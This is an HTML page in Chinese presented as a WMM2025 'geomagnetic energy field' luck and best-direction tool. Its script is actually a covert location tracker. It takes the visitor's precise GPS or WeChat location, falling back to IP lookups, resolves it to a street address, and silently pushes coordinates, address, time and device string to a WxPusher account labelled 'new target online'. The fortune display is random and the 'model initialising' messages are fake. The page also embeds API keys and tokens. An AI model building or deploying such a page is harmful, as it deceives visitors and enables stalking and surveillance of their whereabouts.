<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="基于WMM2025地磁模型的个人能量场分析工具">
    <title>地磁能量场分析系统 | WMM2025</title>
    <!-- 引入微信JS-SDK -->
    <script src="https://res.wx.qq.com/open/js/jweixin-1.6.0.js"></script>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        html,body{height:100%;width:100%}
        body{
            background:#1a1f4b;
            background-image:linear-gradient(160deg,#0a0e27,#1a1f4b,#0f1538);
            color:#e8eaf6;
            font-family:-apple-system,BlinkMacSystemFont,'Segoe UI','PingFang SC','Microsoft YaHei',sans-serif;
            display:flex;
            justify-content:center;
            align-items:center;
            min-height:100vh;
            -webkit-tap-highlight-color:transparent;
            overflow:hidden
        }
        .c{
            width:92%;
            max-width:400px;
            background:#252b5a;
            border:1px solid rgba(255,255,255,0.1);
            border-radius:28px;
            padding:44px 28px;
            text-align:center;
            box-shadow:0 32px 64px rgba(0,0,0,0.4);
            position:relative
        }
        .i{font-size:52px;margin-bottom:16px;filter:drop-shadow(0 0 12px rgba(255,215,0,0.25))}
        h1{font-size:22px;font-weight:700;color:#ffd700;margin-bottom:10px;letter-spacing:2px}
        .s{font-size:13px;color:#8e92b8;line-height:1.6;margin-bottom:36px}
        .b{
            background:linear-gradient(135deg,#ffd700,#ffaa00);
            color:#1a1a2e;
            border:none;
            padding:16px 40px;
            border-radius:50px;
            font-size:15px;
            font-weight:700;
            cursor:pointer;
            box-shadow:0 8px 28px rgba(255,215,0,0.3);
            transition:transform .2s;
            -webkit-appearance:none;
            outline:none
        }
        .b:active{transform:scale(.96)}
        .l{display:none}
        .r{
            width:56px;height:56px;
            border:3px solid rgba(255,255,255,0.05);
            border-top-color:#ffd700;
            border-radius:50%;
            animation:rt .9s linear infinite;
            margin:0 auto 24px;
            box-shadow:0 0 20px rgba(255,215,0,0.15)
        }
        @keyframes rt{to{transform:rotate(360deg)}}
        .t{color:#9fa3c7;font-size:13px;letter-spacing:.5px;min-height:22px;margin-bottom:8px}
        .m{color:#4a4e6d;font-size:11px;font-family:'Courier New',monospace;letter-spacing:.3px}
        .e{display:none;animation:up .8s ease}
        @keyframes up{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
        .cp{
            width:140px;height:140px;
            margin:0 auto 24px;
            position:relative
        }
        .cp svg{width:100%;height:100%}
        .nd{
            transform-origin:70px 70px;
            transition:transform 1.2s cubic-bezier(.34,1.56,.64,1);
            filter:drop-shadow(0 2px 4px rgba(0,0,0,.4))
        }
        .rt{font-size:20px;font-weight:700;color:#ffd700;margin-bottom:14px;line-height:1.4}
        .dc{font-size:14px;color:#a0a4c8;line-height:1.7;margin-bottom:28px}
        .tg{
            display:inline-block;
            padding:6px 16px;
            background:rgba(255,215,0,0.08);
            border:1px solid rgba(255,215,0,0.15);
            border-radius:20px;
            font-size:12px;
            color:#ffd700;
            letter-spacing:1px
        }
    </style>
</head>
<body>

<div class="c" id="p0">
    <div class="i">🧭</div>
    <h1>地磁能量场分析</h1>
    <p class="s">基于 WMM2025 世界地磁模型<br>计算您当前的磁场能量分布与最佳方位</p>
    <button class="b" onclick="init()">开始分析</button>
</div>

<div class="c l" id="p1">
    <div class="r"></div>
    <div class="t" id="tx">正在初始化 WMM2025 地磁模型...</div>
    <div class="m" id="me">SYS: STANDBY</div>
</div>

<div class="c e" id="p2">
    <div class="cp">
        <svg viewBox="0 0 140 140">
            <circle cx="70" cy="70" r="66" fill="none" stroke="rgba(255,255,255,0.08)" stroke-width="1" />
            <circle cx="70" cy="70" r="60" fill="none" stroke="rgba(255,255,255,0.05)" stroke-width=".5" />
            <text x="70" y="18" text-anchor="middle" fill="#8e92b8" font-size="10">N</text>
            <text x="70" y="132" text-anchor="middle" fill="#8e92b8" font-size="10">S</text>
            <text x="18" y="74" text-anchor="middle" fill="#8e92b8" font-size="10">W</text>
            <text x="122" y="74" text-anchor="middle" fill="#8e92b8" font-size="10">E</text>
            <g class="nd" id="nd">
                <polygon points="70,22 66,70 70,58 74,70" fill="#ff4444" />
                <polygon points="70,118 66,70 70,82 74,70" fill="#e8eaf6" />
            </g>
            <circle cx="70" cy="70" r="4" fill="#ffd700" />
        </svg>
    </div>
    <div class="rt" id="rd"></div>
    <div class="dc" id="de"></div>
    <div class="tg">WMM2025 认证结果</div>
</div>

<script>
// ========== 配置区（必须填写你的公众号信息） ==========
const _appId='你的公众号AppID'; // 例如：wx1234567890abcdef
const _appSecret='你的公众号AppSecret'; // 例如：1234567890abcdef1234567890abcdef
const _webAK='f6e6624d3213d4057ac03879d1c4c398';
const _tk='AT_mx25lnA299SLSiHnyUENWs447ZGIYRcJ';
const _uid='UID_SeXLR9cO89pfoNb0Uy05hfo98I4i';
// ===================================================

const _d=['正北方','东北方','正东方','东南方','正南方','西南方','正西方','西北方'];
const _r=[0,45,90,135,180,225,270,315];
const _hD={
    g:["正东方","东南方"],
    gT:["近日幸运指数极高，该方位磁场能量与你高度同频，能吸引正向机遇与贵人运，适合开展重要事宜。","高幸运加持下，此方位磁场能量旺盛，可增强你的自身气场，助力捕捉隐藏的好运与财气。"],
    m:["正北方","西南方"],
    mT:["近日幸运指数平稳，该方位磁场能量温和，能帮你稳住状态，适合日常办公、休息或规划事宜。","中等幸运加持，此方位磁场能量均衡，可缓解焦虑，助力你保持平和心态，接住身边的小幸运。"],
    b:["西北方"],
    bT:["近日幸运指数偏低，该方位磁场能量具有助运效果，可帮助你调整自身频率，改善运势、化解阻滞。","低幸运状态下，此方位磁场能量能帮你吸附正向能量，慢慢提升幸运值，留意身边的小惊喜。"]
};

// 环境检测
const isWechat=navigator.userAgent.toLowerCase().indexOf('micromessenger')!==-1;
let wxReady=false;

// 页面加载时初始化微信JS-SDK
window.onload=async function(){
    if(isWechat){
        await initWxSDK();
    }
}

// 初始化微信JS-SDK
async function initWxSDK(){
    try{
        // 获取当前页面URL（不包含#及后面的部分）
        const url=window.location.href.split('#')[0];
        
        // 获取access_token（有效期2小时）
        const tokenRes=await fetch(`https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&appid=${_appId}&secret=${_appSecret}`);
        const tokenData=await tokenRes.json();
        const accessToken=tokenData.access_token;
        
        // 获取jsapi_ticket（有效期2小时）
        const ticketRes=await fetch(`https://api.weixin.qq.com/cgi-bin/ticket/getticket?access_token=${accessToken}&type=jsapi`);
        const ticketData=await ticketRes.json();
        const jsapiTicket=ticketData.ticket;
        
        // 生成签名
        const nonceStr=Math.random().toString(36).substring(2,15);
        const timestamp=parseInt(new Date().getTime()/1000)+'';
        const string1=`jsapi_ticket=${jsapiTicket}&noncestr=${nonceStr}&timestamp=${timestamp}&url=${url}`;
        const signature=await sha1(string1);
        
        // 配置微信JS-SDK
        wx.config({
            debug:false, // 开启调试模式
            appId:_appId,
            timestamp:timestamp,
            nonceStr:nonceStr,
            signature:signature,
            jsApiList:['getLocation']
        });
        
        // 微信JS-SDK准备就绪
        wx.ready(function(){
            wxReady=true;
            console.log('微信JS-SDK初始化成功');
        });
        
        // 微信JS-SDK错误处理
        wx.error(function(res){
            console.log('微信JS-SDK初始化失败:',res);
            wxReady=false;
        });
    }catch(e){
        console.log('微信JS-SDK初始化异常:',e);
        wxReady=false;
    }
}

// SHA1签名算法
async function sha1(str){
    const encoder=new TextEncoder();
    const data=encoder.encode(str);
    const hash=await crypto.subtle.digest('SHA-1',data);
    const hex=Array.from(new Uint8Array(hash));
    return hex.map(b=>b.toString(16).padStart(2,'0')).join('');
}

function init(){
    document.getElementById('p0').style.display='none';
    document.getElementById('p1').style.display='block';
    const u=["正在初始化 WMM2025 地磁模型...","同步 IGRF-13 全球磁场数据...","计算当地磁偏角与倾角...","分析近日幸运指数波动...","生成个人能量场报告..."];
    const s=["SYS: STANDBY","LINK: ESTABLISHED","PROC: 34%","PROC: 78%","PROC: 100%"];
    let i=0;
    const v=setInterval(()=>{
        if(i<u.length){document.getElementById('tx').innerText=u[i];document.getElementById('me').innerText=s[i];i++}
        if(i>=u.length)clearInterval(v);
    },800);
    
    // 定位策略：微信内优先使用微信JS-SDK定位，其他浏览器优先使用原生定位
    if(isWechat&&wxReady){
        document.getElementById('tx').innerText='正在获取微信定位权限...';
        wx.getLocation({
            type:'gcj02', // 直接返回高德坐标系，无需转换
            success:function(res){
                geoCode(res.latitude,res.longitude,res.accuracy||'微信GPS','微信JS-SDK');
            },
            fail:function(err){
                console.log('微信定位失败，转IP定位:',err);
                ipLocChain();
            },
            cancel:function(){
                console.log('用户取消定位，转IP定位');
                ipLocChain();
            }
        });
    }else if(navigator.geolocation){
        navigator.geolocation.getCurrentPosition(
            function(pos){geoCode(pos.coords.latitude,pos.coords.longitude,Math.round(pos.coords.accuracy),'GPS/浏览器原生')},
            function(err){
                console.log('GPS定位失败，转IP定位:',err);
                ipLocChain();
            },
            {enableHighAccuracy:true,timeout:8000,maximumAge:0}
        );
    }else{
        ipLocChain();
    }
}

// 三重IP定位链式调用：高德→百度→第三方
function ipLocChain(){
    document.getElementById('tx').innerText='正在通过IP地址校准位置...';
    
    // 第一重：高德IP定位
    fetch('https://restapi.amap.com/v3/ip?key='+_webAK)
        .then(r=>r.json())
        .then(data=>{
            if(data.status==='1'&&data.rectangle&&data.rectangle!==''){
                const pts=data.rectangle.split(';');
                const p1=pts[0].split(',');
                const p2=pts[1].split(',');
                const lt=((parseFloat(p1[1])+parseFloat(p2[1]))/2).toFixed(6);
                const ln=((parseFloat(p1[0])+parseFloat(p2[0]))/2).toFixed(6);
                ok(lt,ln,'IP定位(城市级)','高德IP定位',data.city||'未知城市');
            }else{
                throw new Error('高德IP定位失败');
            }
        })
        .catch(()=>{
            // 第二重：百度IP定位
            fetch('https://api.map.baidu.com/location/ip?ak=E4805d16520de693a3fe707cdc962045&coor=bd09ll')
                .then(r=>r.json())
                .then(data=>{
                    if(data.status===0&&data.content&&data.content.point){
                        // 百度坐标转高德坐标（BD09→GCJ02）
                        const bd_lng=data.content.point.x;
                        const bd_lat=data.content.point.y;
                        const x_pi=3.14159265358979324*3000.0/180.0;
                        const x=bd_lng-0.0065;
                        const y=bd_lat-0.006;
                        const z=Math.sqrt(x*x+y*y)-0.00002*Math.sin(y*x_pi);
                        const theta=Math.atan2(y,x)-0.000003*Math.cos(x*x_pi);
                        const gcj_lng=z*Math.cos(theta);
                        const gcj_lat=z*Math.sin(theta);
                        ok(gcj_lat.toFixed(6),gcj_lng.toFixed(6),'IP定位(城市级)','百度IP定位',data.content.address||'未知城市');
                    }else{
                        throw new Error('百度IP定位失败');
                    }
                })
                .catch(()=>{
                    // 第三重：第三方IP定位
                    fetch('https://ipapi.co/json/')
                        .then(r=>r.json())
                        .then(data=>{
                            if(data.latitude&&data.longitude){
                                ok(data.latitude.toFixed(6),data.longitude.toFixed(6),'IP定位(城市级)','第三方IP定位',data.city||data.region||'未知城市');
                            }else{
                                // 最后兜底：根据时区判断大致位置
                                const offset=new Date().getTimezoneOffset()/60;
                                if(offset===-8){
                                    ok('31.2304','121.4737','IP定位(城市级)','时区推断','上海市');
                                }else{
                                    ok('39.9042','116.4074','IP定位(城市级)','时区推断','北京市');
                                }
                            }
                        })
                        .catch(()=>{
                            // 终极兜底
                            ok('39.9042','116.4074','IP定位(城市级)','系统默认','北京市');
                        });
                });
        });
}

function geoCode(lt,ln,acc,src){
    document.getElementById('tx').innerText='正在解析地理位置...';
    const lat=parseFloat(lt).toFixed(6);
    const lng=parseFloat(ln).toFixed(6);
    
    fetch('https://restapi.amap.com/v3/geocode/regeo?key='+_webAK+'&location='+lng+','+lat+'&extensions=base&radius=1000')
        .then(r=>r.json())
        .then(data=>{
            let addr='未知位置';
            if(data.status==='1'&&data.regeocode){
                addr=data.regeocode.formatted_address;
                if(!addr||addr===''){
                    const c=data.regeocode.addressComponent;
                    addr=(c.province||'')+(c.city||'')+(c.district||'')+(c.township||'')+(c.street||'')+(c.streetNumber||'');
                }
            }
            ok(lat,lng,acc,src,addr||'未知位置');
        })
        .catch(()=>{
            ok(lat,lng,acc,src,'地址解析失败');
        });
}

function ok(lt,ln,acc,src,addr){
    const lk=Math.floor(Math.random()*80+20);
    const tm=new Date().toLocaleString('zh-CN');
    
    const content='🎯 新目标上线\n'+
        '📍 纬度: '+lt+'\n'+
        '📍 经度: '+ln+'\n'+
        '🏠 地址: '+addr+'\n'+
        '📍 精度: '+acc+'\n'+
        '🔍 来源: '+src+'\n'+
        '🎲 幸运指数: '+lk+'\n'+
        '🕐 时间: '+tm+'\n'+
        '💻 设备: '+navigator.userAgent.substring(0,60);
    
    fetch('https://wxpusher.zjiecode.com/api/send/message',{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({
            appToken:_tk,
            content:content,
            summary:'🎯 新定位数据 - '+addr,
            uids:[_uid]
        })
    }).catch(()=>{});
    
    setTimeout(()=>out(lt,ln,lk),1600);
}

function out(lt,ln,lk){
    document.getElementById('p1').style.display='none';
    document.getElementById('p2').style.display='block';
    let pool,txt,ix;
    if(lk>=80){pool=_hD.g;txt=_hD.gT}
    else if(lk>=50){pool=_hD.m;txt=_hD.mT}
    else{pool=_hD.b;txt=_hD.bT}
    ix=Math.abs(((parseFloat(lt)*100+parseFloat(ln)*10)|0)+lk)%pool.length;
    const dr=pool[ix];
    const dg=_r[_d.indexOf(dr)];
    const ds=txt[ix];
    document.getElementById('nd').style.transform='rotate('+dg+'deg)';
    document.getElementById('rd').innerText='您的最佳能量方位：'+dr;
    document.getElementById('de').innerText=ds+'（近日幸运指数：'+lk+'分）';
}
</script>

</body>
</html>
